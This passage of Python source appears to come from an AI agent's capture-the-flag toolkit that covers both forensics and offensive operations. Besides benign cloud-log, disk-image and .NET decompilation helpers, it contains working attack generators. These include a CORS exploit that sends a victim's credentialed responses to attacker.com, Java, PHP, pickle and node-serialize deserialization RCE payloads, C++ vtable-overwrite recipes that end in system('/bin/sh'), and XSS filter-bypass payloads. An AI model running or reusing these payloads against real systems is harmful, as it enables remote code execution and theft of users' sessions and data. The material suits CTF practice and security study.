            "ecc": "ECC challenge. Run ecc_special_attacks detect to check: anomalous (Smart's), low embedding degree (MOV), smooth order (Pohlig-Hellman), or ECDSA nonce bias (ecdsa_lattice).",
            "ssti": "SSTI detected. Use ssti_rce detect to fingerprint engine, then ssti_rce escalate to get RCE payloads with sandbox escape chains.",
            "deserialization": "Deserialization vulnerability. Use deserialization_exploit list to find available gadget chains, then generate payload for the target language/framework.",
            "sqli": "SQL injection. Run sqlmap with level=3,risk=2, try UNION, error-based, time-based blind. Check OOB if blind.",
        }
        if best_tech in narratives:
            lines.append(f"\nAttack narrative:\n  {narratives[best_tech]}")

    if use_api:
        api_key = os.environ.get("ANTHROPIC_API_KEY", "")
        if api_key:
            lines.append("\n[API classification requested — use rank_hypotheses tool for API-based analysis]")
        else:
            lines.append("\n[API classification: ANTHROPIC_API_KEY not set]")

    return "\n".join(lines)


def tool_cloud_forensics(path: str, operation: str = "analyze",
                          cloud: str = "aws", keyword: str = "") -> str:
    """Cloud forensics: analyze (detect log type), cloudtrail (AWS CloudTrail event analysis),
    gcp_audit (GCP audit logs), azure_activity (Azure activity logs),
    s3_access (S3 access logs), lambda_logs (CloudWatch Lambda), timeline (chronological events)."""

    wp = _w2l(path) if (IS_WINDOWS and USE_WSL) else path
    kw = keyword or "flag"

    if operation == "analyze":
        code = f"""
import json, os, glob, re
path = {repr(wp)}
files = glob.glob(path + '/**/*.json', recursive=True) + glob.glob(path + '/*.json') + [path]
files = [f for f in files if os.path.isfile(f)]
print(f"Files found: {{len(files)}}")
for fp in files[:5]:
    print(f"\\n--- {{fp}} ---")
    try:
        with open(fp) as f:
            data = json.load(f)
        if isinstance(data, dict):
            keys = list(data.keys())[:10]
            print(f"Keys: {{keys}}")
            # Detect log type
            if 'Records' in data and isinstance(data['Records'], list):
                r = data['Records'][0] if data['Records'] else {{}}
                if 'eventSource' in r: print(f"AWS CloudTrail detected")
                elif 'methodName' in r: print(f"GCP Audit Log detected")
            elif 'value' in data and isinstance(data.get('value'), list):
                print("Azure Activity Log detected")
    except Exception as ex:
        print(f"Parse error: {{ex}}")
        # Try as text
        content = open(fp).read()[:500]
        print(f"Content preview: {{content}}")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "cloudtrail":
        code = f"""
import json, glob, os, re
from collections import defaultdict
path = {repr(wp)}
kw = {repr(kw)}

records = []
for fp in glob.glob(path + '/**/*.json', recursive=True) + [path]:
    if not os.path.isfile(fp): continue
    try:
        with open(fp) as f: data = json.load(f)
        if 'Records' in data:
            records.extend(data['Records'])
    except: pass

print(f"Total CloudTrail events: {{len(records)}}")

# Sort by time
records.sort(key=lambda r: r.get('eventTime', ''))

# Summarize
events_by_user = defaultdict(list)
errors = []
interesting = []
for r in records:
    user = r.get('userIdentity', {{}}).get('userName') or r.get('userIdentity', {{}}).get('type', '?')
    events_by_user[user].append(r.get('eventName','?'))
    if r.get('errorCode'): errors.append(f"{{r.get('eventTime','')}}: {{r.get('errorCode')}} {{r.get('eventName')}}")
    name = r.get('eventName','').lower()
    if any(kw2 in name for kw2 in ['getobject','putobject','invoke','assume','create','delete',kw.lower()]):
        interesting.append(f"{{r.get('eventTime','')}}: {{r.get('eventName')}} by {{user}}")

print("\\nEvents per user:")
for user, evts in list(events_by_user.items())[:10]:
    print(f"  {{user}}: {{len(evts)}} events — {{', '.join(set(evts))[:80]}}")

print(f"\\nErrors ({{len(errors)}}):")
for e in errors[:10]: print(f"  {{e}}")

print(f"\\nInteresting events:")
for ev in interesting[:20]: print(f"  {{ev}}")

# Keyword search
if kw != 'flag':
    kw_hits = [r for r in records if kw.lower() in json.dumps(r).lower()]
    print(f"\\nKeyword '{{kw}}' matches: {{len(kw_hits)}}")
    for r in kw_hits[:5]: print(f"  {{json.dumps(r)[:200]}}")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "gcp_audit":
        code = f"""
import json, glob, os
from collections import defaultdict
path = {repr(wp)}
kw = {repr(kw)}

records = []
for fp in glob.glob(path + '/**/*.json', recursive=True) + [path]:
    if not os.path.isfile(fp): continue
    try:
        with open(fp) as f: data = json.load(f)
        if isinstance(data, list): records.extend(data)
        elif 'entries' in data: records.extend(data['entries'])
        else: records.append(data)
    except: pass

print(f"Total GCP log entries: {{len(records)}}")
for r in sorted(records, key=lambda x: x.get('timestamp',''))[:30]:
    ts   = r.get('timestamp','?')[:19]
    meth = r.get('protoPayload',{{}}).get('methodName', r.get('logName','?'))
    prin = r.get('protoPayload',{{}}).get('authenticationInfo',{{}}).get('principalEmail','?')
    res  = r.get('resource',{{}}).get('labels',{{}})
    print(f"{{ts}} | {{prin}} | {{meth}} | {{res}}")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "s3_access":
        return _shell(f"grep -iE 'GET|PUT|DELETE|HEAD' '{wp}' | "
                     f"awk '{{print $8, $7, $9, $12}}' | sort | head -30 && "
                     f"echo '--- 403/404 errors ---' && "
                     f"grep ' 40[34] ' '{wp}' | head -10 && "
                     f"echo '--- Keyword search ---' && "
                     f"grep -i '{kw}' '{wp}' | head -10",
                     timeout=15)

    if operation == "timeline":
        code = f"""
import json, glob, os, re
path = {repr(wp)}
events = []

for fp in glob.glob(path + '/**/*', recursive=True):
    if not os.path.isfile(fp): continue
    try:
        with open(fp) as f: content = f.read()
        # Find timestamps
        for m in re.finditer(r'(\\d{{4}}-\\d{{2}}-\\d{{2}}T\\d{{2}}:\\d{{2}}:\\d{{2}})', content):
            start = max(0, m.start()-10)
            events.append((m.group(1), content[start:m.end()+100].replace('\\n',' ')[:120]))
    except: pass

events.sort()
print(f"Timeline ({{len(events)}} events):")
for ts, ctx in events[:50]:
    print(f"  {{ts}}: {{ctx}}")
"""
        return tool_execute_python(code, timeout=20)

    return "Operations: analyze, cloudtrail, gcp_audit, azure_activity, s3_access, lambda_logs, timeline"


def tool_cors_exploit(target_url: str, operation: str = "probe",
                       origin: str = "", credentials: bool = True,
                       headers: dict = None, cookies: dict = None) -> str:
    """CORS misconfiguration: probe (detect reflection/null/subdomain), exploit (credential theft chain),
    subdomain_check (find takeable subdomains), preflight (complex request bypass)."""
    import urllib.parse as _up

    if operation == "probe":
        code = f"""
import requests, re
requests.packages.urllib3.disable_warnings()
url = {repr(target_url)}
hdrs = {repr(headers or {})}
cks = {repr(cookies or {})}
results = []

test_origins = [
    "https://evil.com",
    "null",
    "https://evil{repr(target_url).split('/')[2] if '/' in repr(target_url) else ''}.com",
    "https://{repr(target_url).split('/')[2].replace("'","") if '//' in target_url else 'example.com'}",
    "https://attacker.com",
]
parsed = re.search(r'https?://([^/]+)', url)
domain = parsed.group(1) if parsed else 'target.com'
test_origins.append(f"https://{{domain}}.evil.com")
test_origins.append(f"https://evil.{{domain}}")
test_origins.append(f"http://{{domain}}")  # http downgrade

for orig in test_origins:
    try:
        r = requests.get(url, headers={{**hdrs, 'Origin': orig}}, cookies=cks,
                         timeout=8, verify=False, allow_redirects=True)
        acao = r.headers.get('Access-Control-Allow-Origin','')
        acac = r.headers.get('Access-Control-Allow-Credentials','')
        acah = r.headers.get('Access-Control-Allow-Headers','')
        if acao:
            vuln = ''
            if acao == orig or acao == '*':
                if acac.lower() == 'true':
                    vuln = ' *** CRITICAL: ACAO reflects + credentials=true ***'
                elif acao == orig:
                    vuln = ' [ACAO reflects origin]'
                elif acao == '*':
                    vuln = ' [wildcard, no credentials]'
            results.append(f"Origin: {{orig[:50]}}\\n  ACAO: {{acao}} ACAC: {{acac}}{{vuln}}")
    except Exception as ex:
        results.append(f"Origin: {{orig}} -> error: {{ex}}")

print('\\n'.join(results) if results else 'No CORS headers detected')
"""
        return tool_execute_python(code, timeout=30)

    if operation == "exploit":
        victim_origin = origin or target_url.split('/')[0] + '//' + (target_url.split('/')[2] if '//' in target_url else 'target.com')
        return (f"CORS credential theft PoC (host on attacker.com):\n\n"
                f"<script>\nfetch('{target_url}', {{\n"
                f"  method: 'GET',\n  credentials: 'include',\n  mode: 'cors'\n}})\n"
                f".then(r => r.text())\n"
                f".then(data => {{\n"
                f"  fetch('https://attacker.com/steal?d=' + btoa(data));\n"
                f"}});\n</script>\n\n"
                f"If ACAO reflects origin + ACAC: true → all cookies/session data exfiltrated.\n"
                f"For POST with JSON body, add: headers: {{'Content-Type': 'application/json'}}\n"
                f"For preflight bypass: use text/plain or form-urlencoded Content-Type.")

    if operation == "subdomain_check":
        code = f"""
import requests, socket, itertools
requests.packages.urllib3.disable_warnings()
import re
parsed = re.search(r'https?://([^/]+)', {repr(target_url)})
domain = parsed.group(1) if parsed else {repr(target_url)}
parts = domain.split('.')
if len(parts) >= 2:
    root = '.'.join(parts[-2:])
else:
    root = domain
prefixes = ['www','api','dev','staging','beta','test','app','admin','portal',
            'cdn','static','assets','media','img','mail','smtp','ftp','vpn']
print(f"Checking subdomains of {{root}} for potential CORS origin confusion...")
for p in prefixes:
    sub = f"{{p}}.{{root}}"
    try:
        socket.gethostbyname(sub)
        r = requests.get(f"https://{{sub}}", timeout=3, verify=False)
        print(f"  ALIVE: {{sub}} ({{r.status_code}})")
    except socket.gaierror:
        print(f"  DEAD (potential takeover): {{sub}}")
    except Exception as ex:
        print(f"  ERROR: {{sub}} -> {{ex}}")
"""
        return tool_execute_python(code, timeout=40)

    if operation == "preflight":
        return f"[preflight] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return "Operations: probe, exploit, subdomain_check, preflight"


def tool_cpp_vtable(binary_path: str = "", operation: str = "detect",
                     target_class: str = "", rip_target: str = "") -> str:
    """C++ vtable exploitation: detect (find vtable pointers, RTTI), type_confusion
    (find cast vulnerabilities), vtable_overwrite (generate payload), vptr_spray,
    fake_vtable (build fake vtable for arbitrary virtual dispatch)."""

    if operation == "detect":
        code = f"""
import subprocess, re
bp = {repr(binary_path)}
if not bp:
    print("Provide binary_path")
else:
    # Find vtable pointers in binary
    r = subprocess.run(['readelf', '-a', bp], capture_output=True, text=True)
    vtables = re.findall(r'(\\w+).*vtable', r.stdout)
    for v in vtables[:20]: print(f"vtable: {{v}}")
    
    # RTTI analysis
    r2 = subprocess.run(['strings', bp], capture_output=True, text=True)
    rtti = [s for s in r2.stdout.split('\\n') if 'typeinfo' in s.lower() or '_ZT' in s]
    for r in rtti[:15]: print(f"RTTI: {{r}}")
    
    # Check for vptr in heap objects
    print()
    print("Ghidra decompile for C++ class detection:")
    print("  Look for: class definition with virtual keyword")
    print("  Look for: _vptr.ClassName assignments in constructors")
    print("  Look for: dynamic_cast, typeid usage (indicates polymorphism)")
    print()
    print("GDB commands for runtime vptr analysis:")
    print("  info vtbl <obj>        — show vtable for object")
    print("  set print vtbl on      — auto-print vtable on p command")
    print("  x/40gx <vtable_addr>   — dump vtable entries")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "type_confusion":
        return f"[type_confusion] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "vtable_overwrite":
        target = rip_target or "system@plt"
        return (f"Vtable pointer overwrite payload:\n\n"
                f"Requires: heap write primitive over a C++ object\n\n"
                f"Step 1: Find vptr offset in object (usually at offset 0x0)\n"
                f"  p/x ((size_t*)obj)[0]   → vptr value\n"
                f"  info vtbl obj            → GDB vtable display\n\n"
                f"Step 2: Build fake vtable in controlled memory\n"
                f"  fake_vtable = [0]*16  # enough slots\n"
                f"  virtual_call_slot = 0  # which virtual method gets called?\n"
                f"  fake_vtable[virtual_call_slot] = {target}  # e.g. system or one_gadget\n\n"
                f"Step 3: Overwrite vptr in heap object\n"
                f"  payload = p64(fake_vtable_addr)  # overwrite first 8 bytes of object\n"
                f"  heap_write(obj_addr, payload)\n\n"
                f"Step 4: Trigger virtual call\n"
                f"  obj->virtualMethod()  → calls fake_vtable[0] = {target}\n\n"
                f"Argument control:\n"
                f"  'this' pointer (rdi) = obj_addr → put /bin/sh string at start of object\n"
                f"  So: *obj = '/bin/sh\\x00', fake_vtable[0] = system → system('/bin/sh')")

    if operation == "fake_vtable":
        return (f"Fake vtable construction:\n\n"
                f"from pwn import *\n"
                f"# Assume you know:\n"
                f"#   obj_addr = address of C++ object (vptr at +0)\n"
                f"#   target_func = function to call (system, one_gadget, etc.)\n"
                f"#   virtual_slot = which slot in vtable gets called (0, 1, 2...)\n\n"
                f"RTTI_OFFSET = -2 * 8  # rtti ptr is typically at vtable[-2]\n"
                f"TOP_OFFSET  = -1 * 8  # top_offset at vtable[-1]\n\n"
                f"# Build fake vtable with enough entries\n"
                f"n_slots = 16\n"
                f"fake_vtable = bytearray(8 * (n_slots + 2))\n\n"
                f"# Standard vtable layout:\n"
                f"# vtable[-2] = top_offset (usually 0)\n"
                f"# vtable[-1] = RTTI pointer (can be 0 if no typeid used)\n"
                f"# vtable[0..] = virtual function pointers\n"
                f"pack_into = lambda b, off, val: b.__setitem__(slice(off, off+8), p64(val))\n"
                f"pack_into(fake_vtable, 0,  0)   # top_offset\n"
                f"pack_into(fake_vtable, 8,  0)   # RTTI (NULL ok for no-RTTI binaries)\n"
                f"pack_into(fake_vtable, 16 + virtual_slot * 8, target_func)\n\n"
                f"# Point fake vptr to vtable[0] (skip top_offset and RTTI)\n"
                f"fake_vptr = fake_vtable_addr + 16\n"
                f"# Overwrite: *(obj_addr) = fake_vptr")

    return ("C++ vtable operations:\n"
            "  detect          — find vtable pointers, RTTI info in binary\n"
            "  type_confusion  — identify unsafe cast patterns\n"
            "  vtable_overwrite— generate heap payload to overwrite vptr\n"
            "  fake_vtable     — build fake vtable struct\n"
            "  vptr_spray      — spray fake vptrs to survive ASLR")


def tool_deserialization_exploit(language: str, operation: str = "list",
                                  gadget_chain: str = "", command: str = "id",
                                  output_format: str = "base64",
                                  extra_args: str = "") -> str:
    """Java ysoserial + PHP phpggc deserialization payloads. language=java|php|python|ruby|node."""
    lang = language.lower()

    if lang == "java":
        if operation == "list":
            out = _shell("java -jar /opt/ysoserial/ysoserial.jar 2>&1 | head -40 || "
                         "ysoserial 2>&1 | head -40 || "
                         "docker run --rm frohoff/ysoserial 2>&1 | head -40")
            if "not found" in out.lower() or "no such" in out.lower():
                return ("ysoserial not found. Install options:\n"
                        "  docker pull frohoff/ysoserial\n"
                        "  wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar\n"
                        "  -O /opt/ysoserial/ysoserial.jar\n\n"
                        "Known gadget chains (built-in reference):\n"
                        "  CommonsCollections1-7, Spring1-2, Hibernate1-2,\n"
                        "  BeanShell1, Clojure, FileUpload1, Groovy1,\n"
                        "  JBossInterceptors1, JavassistWeld1, JRMPClient,\n"
                        "  JRMPListener, JSON1, MozillaRhino1-2, Myfaces1-2,\n"
                        "  ROME, Spring1-2, Vaadin1, Wicket1")
            return out
        if operation in ("generate", "payload"):
            if not gadget_chain: return "Provide gadget_chain (e.g. CommonsCollections1)"
            cmd_escaped = command.replace("'", "\\'").replace('"', '\\"')
            jar_cmd = (f"java -jar /opt/ysoserial/ysoserial.jar '{gadget_chain}' '{cmd_escaped}' 2>/dev/null | "
                       f"{'base64 -w0' if output_format=='base64' else 'xxd | head -20'}")
            out = _shell(jar_cmd, timeout=30)
            if not out.strip():
                # Try docker fallback
                out = _shell(f"docker run --rm frohoff/ysoserial '{gadget_chain}' '{cmd_escaped}' 2>/dev/null | "
                             f"{'base64 -w0' if output_format=='base64' else 'xxd | head -20'}", timeout=30)
            if not out.strip():
                return (f"ysoserial payload generation failed for {gadget_chain}.\n"
                        f"Manual pwntools-style snippet:\n"
                        f"  # Ensure ysoserial.jar is present at /opt/ysoserial/ysoserial.jar\n"
                        f"  payload = subprocess.check_output(['java','-jar','/opt/ysoserial/ysoserial.jar',\n"
                        f"    '{gadget_chain}', '{cmd_escaped}'])\n"
                        f"  # Then send as POST body with Content-Type: application/x-java-serialized-object")
            return f"Payload ({gadget_chain} → {command}):\n{out}"
        if operation == "detect":
            return ("Java deserialization detection patterns:\n"
                    "  Magic bytes: AC ED 00 05 (hex) = rO0AB (base64 prefix)\n"
                    "  HTTP headers: Content-Type: application/x-java-serialized-object\n"
                    "  Endpoints: /invoker/JMXInvokerServlet, ViewState, remoting\n"
                    "  Tools: ysoserial-all.jar for exploitation, SerializationDumper for analysis\n"
                    "  GadgetProbe to detect which chains are available remotely")

    if lang == "php":
        if operation == "list":
            out = _shell("phpggc -l 2>/dev/null | head -60 || php /opt/phpggc/phpggc -l 2>/dev/null | head -60")
            if "not found" in out.lower() or not out.strip():
                return ("phpggc not found. Install:\n"
                        "  git clone https://github.com/ambionics/phpggc /opt/phpggc\n\n"
                        "Major framework chains (built-in reference):\n"
                        "  Laravel/RCE1-8, Symfony/RCE1-9, Yii/RCE1-2,\n"
                        "  Drupal/RCE1, Guzzle/RCE1-2, Monolog/RCE1-8,\n"
                        "  SwiftMailer/FW1, CakePHP/RCE1, Wordpress/RCE1,\n"
                        "  Slim/RCE1, Laminas/RCE1-2, PHPCSFixer/RCE1")
            return out
        if operation in ("generate", "payload"):
            if not gadget_chain: return "Provide gadget_chain (e.g. Laravel/RCE1)"
            cmd_escaped = shlex.quote(command) if hasattr(shlex := __import__('shlex'), 'quote') else f"'{command}'"
            fmt_flag = "--fast-destruct" if "FD" in extra_args else ""
            enc_flag = "-b" if output_format == "base64" else ""
            cmd_str = (f"phpggc {fmt_flag} {enc_flag} '{gadget_chain}' system {cmd_escaped} 2>/dev/null || "
                       f"php /opt/phpggc/phpggc {fmt_flag} {enc_flag} '{gadget_chain}' system {cmd_escaped} 2>/dev/null")
            out = _shell(cmd_str, timeout=20)
            if not out.strip():
                return (f"phpggc payload generation failed for {gadget_chain}.\n"
                        f"Manual:\n  cd /opt/phpggc && php phpggc {gadget_chain} system '{command}' {enc_flag}")
            return f"PHP payload ({gadget_chain} → {command}):\n{out}"

    if lang == "python":
        code = f"""
import pickle, os, base64, subprocess
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('{command}',))
payload = pickle.dumps(Exploit())
print("Pickle payload (hex):", payload.hex())
print("Pickle payload (b64):", base64.b64encode(payload).decode())
print("Length:", len(payload), "bytes")
print()
# Safer exec variant (captures output)
class ExploitCapture(object):
    def __reduce__(self):
        cmd = {repr(command)}
        return (subprocess.check_output, (['/bin/sh', '-c', cmd],))
payload2 = pickle.dumps(ExploitCapture())
print("Capture variant (b64):", base64.b64encode(payload2).decode())
"""
        return tool_execute_python(code)

    if lang == "ruby":
        return ("Ruby Marshal deserialization exploit skeleton:\n"
                "  # Requires a writeable gadget chain in loaded gems\n"
                "  # Universal approach: use universal-ooze or pry\n"
                "  # https://github.com/httpvoid/rails-rce\n\n"
                "  require 'erb'\n  require 'base64'\n"
                "  payload = ERB.new('<%= `" + command + "` %>').result\n"
                "  # Wrap in ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\n"
                "  # or use rails-rce gem: rails_rce.generate('" + command + "')")

    if lang == "node":
        return ("Node.js deserialization exploit (node-serialize):\n"
                f'  var serialize = require("node-serialize");\n'
                f'  var payload = {{"rce": "_$$ND_FUNC$$_function(){{require(\'child_process\')'
                f'.exec(\'{command}\', function(e,s,_){{console.log(s)}})}}()"}}\n'
                f'  console.log(serialize.serialize(payload));  // URL-encode for cookie/param\n\n'
                "  Detection: look for unserialize() calls in node-serialize or funcster packages")

    return f"Unsupported language: {language}. Supported: java, php, python, ruby, node"


def tool_disk_forensics(image_path: str, operation: str = "analyze",
                         partition: int = 0, output_dir: str = "",
                         keyword: str = "") -> str:
    """Disk image forensics: analyze (partition table, filesystem), mount (loop mount),
    recover_files (photorec/foremost), mft (NTFS Master File Table), timeline (mactime/log2timeline),
    deleted_files, keyword_search, hash_check, strings."""

    ip = _w2l(image_path) if (IS_WINDOWS and USE_WSL) else image_path
    out = output_dir or f"/tmp/disk_forensics_{int(time.time())}"

    if operation == "analyze":
        return _shell(f"file '{ip}'; echo '---'; "
                     f"fdisk -l '{ip}' 2>/dev/null || mmls '{ip}' 2>/dev/null; echo '---'; "
                     f"fsstat '{ip}' 2>/dev/null | head -30; echo '---'; "
                     f"blkid '{ip}' 2>/dev/null",
                     timeout=20)

    if operation == "mount":
        offset_cmd = f"$(mmls '{ip}' 2>/dev/null | awk 'NR=={partition+3}{{print $3*512}}')" if partition else "0"
        return _shell(f"mkdir -p '{out}' && "
                     f"mount -o ro,loop,offset={offset_cmd} '{ip}' '{out}' 2>/dev/null && "
                     f"echo 'Mounted at {out}' && ls '{out}' | head -20 || "
                     f"echo 'Mount failed — try: sudo losetup -fP {ip}'",
                     timeout=15)

    if operation == "recover_files":
        return _shell(f"mkdir -p '{out}' && "
                     f"photorec /d '{out}' /cmd '{ip}' fileopt,everything,enable,search 2>&1 | tail -20 || "
                     f"foremost -o '{out}' '{ip}' 2>&1 | tail -10",
                     timeout=120)

    if operation == "mft":
        return _shell(f"analyzeMFT.py -f '{ip}' -o '{out}/mft.csv' 2>/dev/null && "
                     f"head -30 '{out}/mft.csv' || "
                     f"istat -f ntfs '{ip}' 0 2>/dev/null | head -40 || "
                     f"python3 -c \""
                     f"import struct; f=open('{ip}','rb'); "
                     f"data=f.read(1024*1024); "
                     f"pos=0; count=0;\n"
                     f"while pos<len(data)-4 and count<20:\n"
                     f"  if data[pos:pos+4]==b'FILE':\n"
                     f"    print(hex(pos), 'MFT record'); count+=1\n"
                     f"  pos+=512\n"
                     f"\"",
                     timeout=30)

    if operation == "deleted_files":
        return _shell(f"fls -r -d '{ip}' 2>/dev/null | head -50 || "
                     f"extundelete '{ip}' --restore-all --output-dir '{out}' 2>&1 | tail -20",
                     timeout=60)

    if operation == "timeline":
        return _shell(f"fls -m '' -r '{ip}' 2>/dev/null > /tmp/body.txt && "
                     f"mactime -b /tmp/body.txt 2>/dev/null | head -50 || "
                     f"log2timeline.py '{out}/plaso.db' '{ip}' 2>&1 | tail -10",
                     timeout=60)

    if operation == "keyword_search":
        kw = keyword or "flag"
        return _shell(f"strings '{ip}' | grep -i '{kw}' | head -30; "
                     f"bulk_extractor -e email -e find -S 'FIND_LIST={kw}' -o '{out}' '{ip}' 2>&1 | tail -10",
                     timeout=30)

    if operation == "strings":
        return _shell(f"strings -n 8 '{ip}' | grep -vE '^[[:space:]]*$' | head -100", timeout=15)

    if operation == "hash_check":
        return _shell(f"md5sum '{ip}'; sha256sum '{ip}'; "
                     f"echo '---'; sha1sum '{ip}'", timeout=30)

    return "Operations: analyze, mount, recover_files, mft, deleted_files, timeline, keyword_search, strings, hash_check"


def tool_dom_xss(operation: str = "analyze", url_or_path: str = "",
                  html_content: str = "", sink: str = "",
                  extra_payloads: str = "") -> str:
    """DOM XSS: analyze (find sinks in JS), payloads (engine-specific bypass chains),
    dom_clobbering (clobber id/name attributes), mutation_xss (mXSS parser confusion),
    csp_bypass (dangling markup, JSONP, open redirects), prototype_pollution_xss."""

    # DOM_SINKS/SOURCES removed - Claude knows these

    if operation == "analyze":
        target = url_or_path or html_content
        if not target:
            return "Provide url_or_path or html_content"
        code = f"""
import re, sys
try:
    import requests
    requests.packages.urllib3.disable_warnings()
    if {repr(url_or_path)}.startswith('http'):
        r = requests.get({repr(url_or_path)}, timeout=10, verify=False)
        src = r.text
        # Also fetch linked JS
        js_urls = re.findall(r'<script[^>]+src=[\'"]([^\'"]+)[\'"]', src)
        for js_url in js_urls[:5]:
            try:
                if not js_url.startswith('http'):
                    base = '/'.join({repr(url_or_path)}.split('/')[:3])
                    js_url = base + '/' + js_url.lstrip('/')
                jr = requests.get(js_url, timeout=5, verify=False)
                src += '\\n' + jr.text
            except: pass
    else:
        src = {repr(html_content)} or open({repr(url_or_path)}).read()
except Exception as ex:
    src = {repr(html_content)}
    print(f"Fetch error: {{ex}}")

SINKS = ['innerHTML','outerHTML','document.write','document.writeln','eval(','setTimeout(',
         'setInterval(','location.href','location.assign','location.replace',
         '.src =','.href =','.action =','insertAdjacentHTML','createContextualFragment',
         'dangerouslySetInnerHTML','v-html','ng-bind-html','$sce.trustAsHtml']
SOURCES = ['location.hash','location.search','location.href','document.referrer',
           'document.URL','window.name','postMessage','localStorage','sessionStorage','getItem(']

print("=== DOM Sink Analysis ===")
lines = src.split('\\n')
for i, line in enumerate(lines, 1):
    for sink in SINKS:
        if sink in line:
            # Check if a source feeds into it nearby
            context = '\\n'.join(lines[max(0,i-5):i+3])
            source_nearby = [s for s in SOURCES if s in context]
            flag = ' *** SOURCE NEARBY ***' if source_nearby else ''
            print(f"L{{i}}: [SINK: {{sink}}]{{flag}}")
            print(f"  {{line.strip()[:120]}}")
            if source_nearby: print(f"  Sources: {{source_nearby}}")
            break

print("\\n=== Dangerous Patterns ===")
danger_patterns = [
    (r'eval\\s*\\(.*location', 'eval(location.*)'),
    (r'innerHTML.*location', 'innerHTML ← location'),
    (r'document\\.write.*location', 'document.write ← location'),
    (r'window\\[.*\\]\\s*\\(', 'window[computed]() call'),
    (r'new\\s+Function\\s*\\(', 'new Function() constructor'),
    (r'\\$\\(.*location', 'jQuery(location.*)'),
    (r'postMessage.*function', 'postMessage handler'),
]
for pattern, label in danger_patterns:
    matches = re.findall(f'.{{0,40}}{pattern}.{{0,40}}', src, re.IGNORECASE)
    if matches:
        print(f"  {{label}}: {{len(matches)}} occurrence(s)")
        for m in matches[:2]: print(f"    {{m.strip()[:100]}}")
"""
        return tool_execute_python(code, timeout=30)

    if operation == "payloads":
        target_sink = sink or "innerHTML"
        payloads = DOM_SINKS.get(target_sink, DOM_SINKS["innerHTML"])
        lines = [f"=== DOM XSS payloads for sink: {target_sink} ===\n"]
        for p in payloads:
            lines.append(f"  {p}")
        lines.append(f"\nTrigger sources to test: {', '.join(SOURCES[:5])}")
        lines.append("\nEncoded variants (filter bypass):")
        lines.append("  <img src=x onerror=\\u0061lert(1)>  (unicode escape)")
        lines.append("  <img src=x onerror=eval(atob('YWxlcnQoMSk='))>  (base64)")
        lines.append("  <svg><animate onbegin=alert(1) attributeName=x>")
        lines.append("  <details open ontoggle=alert(1)>")
        lines.append("  <input autofocus onfocus=alert(1)>")
        lines.append("  attribute break-out payload")
        lines.append("\njavascript: URI bypasses:")
        lines.append("  java&#x09;script:alert(1)  (tab character)")
        lines.append("  java\\x0ascript:alert(1)   (newline)")
        lines.append("  &#106;avascript:alert(1)   (entity)")
        return "\n".join(lines)

    if operation == "dom_clobbering":
        return f"[dom_clobbering] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "mutation_xss":
        return f"[mutation_xss] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "csp_bypass":
        return f"[csp_bypass] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "prototype_pollution_xss":
        return f"[prototype_pollution_xss] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return "Operations: analyze, payloads, dom_clobbering, mutation_xss, csp_bypass, prototype_pollution_xss"


def tool_dotnet_decompile(binary_path: str, operation: str = "decompile",
                            type_name: str = "", method_name: str = "",
                            output_path: str = "") -> str:
    """Full .NET C# decompilation via ilspycmd/ILSpy. Ops: decompile (full C# output),
    list_types, list_methods, method (single method), strings, resources, references."""

    bp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path

    if operation == "decompile":
        out = output_path or f"/tmp/dotnet_decompile_{int(time.time())}"
        # Try ilspycmd first (most common), fallback to dotnet-decompiler, then ildasm
        result = _shell(f"ilspycmd -p -o '{out}' '{bp}' 2>&1 | head -20", timeout=60)
        if "not found" in result.lower() or "command not found" in result.lower():
            # Try dotnet tool
            result = _shell(f"dotnet ilspycmd -p -o '{out}' '{bp}' 2>&1 | head -20", timeout=60)
        if "not found" in result.lower():
            # Fallback: ildasm for IL
            result = _shell(f"ildasm /text '{bp}' 2>/dev/null || monodis '{bp}' 2>/dev/null | head -100", timeout=30)
            if result.strip():
                return f"[Using IL disassembly (no ilspycmd)]\n{result}"
            return ("ilspycmd not found. Install:\n"
                    "  dotnet tool install -g ilspycmd\n"
                    "  OR: apt install mono-utils (for monodis)\n"
                    "  OR: use dnSpy GUI on Windows\n\n"
                    "Manual decompile: upload .dll/.exe to https://sharplab.io or https://decompiler.dedot.dev")
        # Show decompiled output
        code_out = _shell(f"find '{out}' -name '*.cs' | head -20 && cat '{out}'/*.cs 2>/dev/null | head -200", timeout=10)
        return f"Decompiled to {out}:\n{code_out}"

    if operation == "list_types":
        result = _shell(f"ilspycmd '{bp}' --list 2>&1 | head -60", timeout=30)
        if "not found" in result.lower():
            result = _shell(f"monodis --typedef '{bp}' 2>/dev/null | head -60", timeout=15)
        return result or "No types found (check file is valid .NET assembly)"

    if operation == "list_methods":
        type_filter = f"--type '{type_name}'" if type_name else ""
        result = _shell(f"ilspycmd '{bp}' {type_filter} --list-methods 2>&1 | head -80", timeout=30)
        return result

    if operation == "method":
        if not type_name or not method_name:
            return "Provide type_name and method_name"
        result = _shell(f"ilspycmd '{bp}' -t '{type_name}' -m '{method_name}' 2>&1", timeout=30)
        return result

    if operation == "strings":
        result = _shell(f"strings '{bp}' | grep -v '^\\.' | grep -v '^_' | grep -v 'System\\.' | head -80", timeout=10)
        return result

    if operation == "resources":
        result = _shell(f"ilspycmd '{bp}' --resources 2>/dev/null || "
                       f"monodis --resources '{bp}' 2>/dev/null || "
                       f"unzip -l '{bp}' 2>/dev/null | head -30", timeout=15)
        return result

    if operation == "references":
        result = _shell(f"monodis --assemblyref '{bp}' 2>/dev/null || "
                       f"ilspycmd '{bp}' --show-assembly-info 2>/dev/null | head -30", timeout=15)
        return result

    if operation == "patch":
        # Patch IL using dnlib or Mono.Cecil
        patch_code = f"""
try:
    import subprocess
    # Try using Cecil via Python for simple patches
    patch_script = '''
using Mono.Cecil;
using Mono.Cecil.Cil;
var asm = AssemblyDefinition.ReadAssembly("{bp}");
// TODO: modify instructions
asm.Write("{bp}.patched.dll");
Console.WriteLine("Patched!");
'''
